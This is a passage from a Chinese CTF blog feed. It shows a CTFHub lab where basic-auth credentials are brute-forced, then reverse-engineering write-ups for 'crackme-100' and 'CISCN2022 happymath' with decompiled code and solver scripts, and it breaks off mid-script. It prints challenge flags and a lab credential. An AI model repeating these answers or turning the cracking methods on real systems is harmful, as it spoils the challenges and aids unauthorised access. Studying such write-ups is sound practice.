src="https://s2.loli.net/2024/07/26/wyDjHabJuh783ek.png" alt="image-20240726164807767"></p><p>这样开始爆破</p><p>没出来，难受。去网上看wp，它们说要把下面的payloadURL编码去掉，然后就对了，不理解</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">YWRtaW46bXVzdGFuZw</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">ctfhub&#123;<span class="number">6</span>fd9a3602ed44a12e16ba9eb&#125;</span><br></pre></td></tr></table></figure><h4 id="相应包源代码"><a href="#相应包源代码" class="headerlink" title="相应包源代码"></a>相应包源代码</h4><p>点击按钮，没用拦到信息，所以应该是发了一个代码过来</p><p>f12看源代码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">669</span><span class="keyword">c</span><span class="number">2</span>d<span class="number">83e81</span><span class="keyword">c</span><span class="number">22</span><span class="keyword">c</span><span class="number">497</span>bece<span class="number">5</span>b&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">水一点web基础，，不然显得我什么都没干</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="web" scheme="https://www.pri87.vip/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>暑假学习记录2</title>
    <link href="https://www.pri87.vip/posts/d7a4634e.html"/>
    <id>https://www.pri87.vip/posts/d7a4634e.html</id>
    <published>2024-08-05T13:13:38.000Z</published>
    <updated>2024-08-06T14:23:29.536Z</updated>
    
    <content type="html"><![CDATA[<div class="note info simple"><p>目录：</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">学习记录1</a> </p><p><a href="https://www.pri87.vip/posts/d7a4634e.html">学习记录2</a> &lt;&#x3D;</p></div><p>还是差不多，没写什么东西，也没学多少</p><hr><h2 id="wp"><a href="#wp" class="headerlink" title="wp:"></a>wp:</h2><h3 id="crackme-100"><a href="#crackme-100" class="headerlink" title="crackme-100"></a>crackme-100</h3><p>在学互斥体的时候看到的一个crackme</p><p>一进main函数看到了不能被解析的内容</p><p><img src="https://s2.loli.net/2024/08/05/SvDRnMdlOagCbrT.png" alt="img"></p><p>不敢乱动，还是直接看汇编吧</p><p>这里的汇编是判断了两次长度，然后进入了一个函数检查,这个是第一个地方</p><p>进去看看</p><p><img src="https://s2.loli.net/2024/08/05/Skv5cEfN1K8rMx4.png" alt="img"></p><p>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_401180</span><span class="params">(<span class="type">char</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPWSTR CommandLineW; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR v6; <span class="comment">// edi</span></span><br><span class="line">  WCHAR v7; <span class="comment">// cx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// edi</span></span><br><span class="line">  __int16 v9; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  __int16 v11; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _WORD *v13; <span class="comment">// edi</span></span><br><span class="line">  __int16 v14; <span class="comment">// cx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+10h] [ebp-11A8h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesRead; <span class="comment">// [esp+20h] [ebp-1198h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesWritten; <span class="comment">// [esp+24h] [ebp-1194h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOW</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+28h] [ebp-1190h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+70h] [ebp-1148h] BYREF</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [esp+D0h] [ebp-10E8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">3</span>]; <span class="comment">// [esp+3A0h] [ebp-E18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+3ACh] [ebp-E0Ch]</span></span><br><span class="line">  <span class="type">int</span> Buffer[<span class="number">255</span>]; <span class="comment">// [esp+3B0h] [ebp-E08h] BYREF</span></span><br><span class="line">  _BYTE v25[<span class="number">2</span>]; <span class="comment">// [esp+7AEh] [ebp-A0Ah] BYREF</span></span><br><span class="line">  WCHAR CommandLine[<span class="number">1282</span>]; <span class="comment">// [esp+7B0h] [ebp-A08h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(StartupInfo));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));</span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(CommandLine, <span class="number">0</span>, <span class="number">0xA00</span>u);</span><br><span class="line">  CommandLineW = GetCommandLineW();</span><br><span class="line">  v3 = CommandLineW;</span><br><span class="line">  <span class="keyword">while</span> ( *CommandLineW++ )</span><br><span class="line">    ;</span><br><span class="line">  v5 = (<span class="type">char</span> *)CommandLineW - (<span class="type">char</span> *)v3;</span><br><span class="line">  v6 = (LPWSTR)v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v6[<span class="number">1</span>];</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 );</span><br><span class="line">  qmemcpy(v6, v3, v5);</span><br><span class="line">  v8 = v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *((_WORD *)v8 + <span class="number">1</span>);</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 );</span><br><span class="line">  *(_DWORD *)v8 = <span class="number">32</span>;</span><br><span class="line">  v10 = this;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(_WORD *)v10;</span><br><span class="line">    v10 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 );</span><br><span class="line">  v12 = v10 - this;</span><br><span class="line">  v13 = v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v13[<span class="number">1</span>];</span><br><span class="line">    ++v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v14 );</span><br><span class="line">  qmemcpy(v13, this, v12);</span><br><span class="line">  CreateProcessW(<span class="number">0</span>, CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">while</span> ( DebugEvent.dwDebugEventCode != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">    WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  Context.ContextFlags = <span class="number">65537</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">  v22[<span class="number">0</span>] = <span class="number">344606352</span>;</span><br><span class="line">  v22[<span class="number">1</span>] = <span class="number">252981262</span>;</span><br><span class="line">  v22[<span class="number">2</span>] = <span class="number">1976056641</span>;</span><br><span class="line">  v23 = <span class="number">-11</span>;</span><br><span class="line">  WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), v22, <span class="number">0xD</span>u, &amp;NumberOfBytesWritten);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] == <span class="number">727473189</span> &amp;&amp; Buffer[<span class="number">1</span>] == <span class="number">907631919</span> &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">1987208236</span> )</span><br><span class="line">    <span class="keyword">return</span> -(Buffer[<span class="number">3</span>] != <span class="number">1380869760</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点只在最后13行，前面都是初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), v22, <span class="number">0xD</span>u, &amp;NumberOfBytesWritten);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] == <span class="number">727473189</span> &amp;&amp; Buffer[<span class="number">1</span>] == <span class="number">907631919</span> &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">1987208236</span> )</span><br><span class="line">    <span class="keyword">return</span> -(Buffer[<span class="number">3</span>] != <span class="number">1380869760</span>);</span><br></pre></td></tr></table></figure><p>这里可以看到最后的输出条件，同时它是创建了一个新进程。并把输入作为参数一起打开，然后用WaitForDebugEvent来读取调试，读取到后patch后面的几个字节，地方是Context.Eip - 1，也就是程序执行到的位置，刚刚的main函数里面刚好就有一个int3断点，在那里直接patch得到最后的逻辑</p><p><img src="https://s2.loli.net/2024/08/05/8Q9namgWbVYdZ7S.png" alt="img"></p><p>所以只是一个异或然后一个加值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x25</span>,<span class="number">0x5c</span>,<span class="number">0x5c</span>,<span class="number">0x2b</span>,<span class="number">0x2f</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x36</span>,<span class="number">0x2c</span>,<span class="number">0x64</span>,<span class="number">0x72</span>,<span class="number">0x76</span>,<span class="number">0x80</span>,<span class="number">0x66</span>,<span class="number">0x4e</span>,<span class="number">0x52</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]-=<span class="number">1</span></span><br><span class="line">s = <span class="string">&#x27;elcome to CFF test!&#x27;</span></span><br><span class="line">pxor(last,s)</span><br></pre></td></tr></table></figure><h3 id="CISCN2022-happymath"><a href="#CISCN2022-happymath" class="headerlink" title="CISCN2022 happymath"></a>CISCN2022 happymath</h3><p>进去直接看main：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, input);</span><br><span class="line">  len = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++len;</span><br><span class="line">  <span class="keyword">while</span> ( input[len] );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)len == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    j = <span class="number">0</span>i64;</span><br><span class="line">    k = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = input[k];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v6 - <span class="string">&#x27;a&#x27;</span>) &gt; <span class="number">5u</span> &amp;&amp; (<span class="type">unsigned</span> __int8)(v6 - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++k &gt;= <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        n = <span class="number">0</span>i64;</span><br><span class="line">        m = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sk = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">for</span> ( i = j; i &lt; m; sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>) )</span><br><span class="line">            mid = input[i++];</span><br><span class="line">          v12 = (sk | ~*(_DWORD *)((<span class="type">char</span> *)&amp;t2 + j)) &amp; ~(sk &amp; ~*(_DWORD *)((<span class="type">char</span> *)&amp;t2 + j));</span><br><span class="line">          v13 = ((((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">16</span>) | ((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">          v14 = ((v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>))) &gt;&gt; <span class="number">1</span>) | v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">          v15 = (((v14 &gt;&gt; <span class="number">2</span>) | v14) &gt;&gt; <span class="number">4</span>) | (v14 &gt;&gt; <span class="number">2</span>) | v14;</span><br><span class="line">          v16 = (((v15 &gt;&gt; <span class="number">8</span>) | v15) &gt;&gt; <span class="number">16</span>) | (v15 &gt;&gt; <span class="number">8</span>) | v15;</span><br><span class="line">          v17 = (<span class="number">4</span> * ((<span class="number">2</span> * v16) | v16)) | (<span class="number">2</span> * v16) | v16;</span><br><span class="line">          v18 = (((<span class="number">16</span> * v17) | v17) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v17) | v17;</span><br><span class="line">          v19 = (<span class="number">4</span> * ((<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>)) | (<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>;</span><br><span class="line">          v20 = (((<span class="number">16</span> * v19) | v19) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v19) | v19;</span><br><span class="line">          <span class="keyword">if</span> ( ((v20 | (v20 &lt;&lt; <span class="number">16</span>)) &amp; (~((v18 &lt;&lt; <span class="number">16</span>) | v18) | v18 &amp; <span class="number">1</span>)) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          m += <span class="number">4</span>;</span><br><span class="line">          n += <span class="number">256</span>i64;</span><br><span class="line">          j += <span class="number">4</span>i64;</span><br><span class="line">          <span class="keyword">if</span> ( m &gt;= <span class="number">36</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_7FF6471D1020(<span class="string">&quot;Your flag is flag&#123;%s&#125;\n&quot;</span>, input);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6471D1020(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = j; i &lt; m; sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>) )</span><br><span class="line">mid = input[i++];</span><br><span class="line"><span class="comment">//改写为</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mid = input[i];</span><br><span class="line">sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，这里每四个字节用t1表生成每次的密钥sk，生成只和输入和n有关，校验只和sk有关。那么直接写爆破脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span 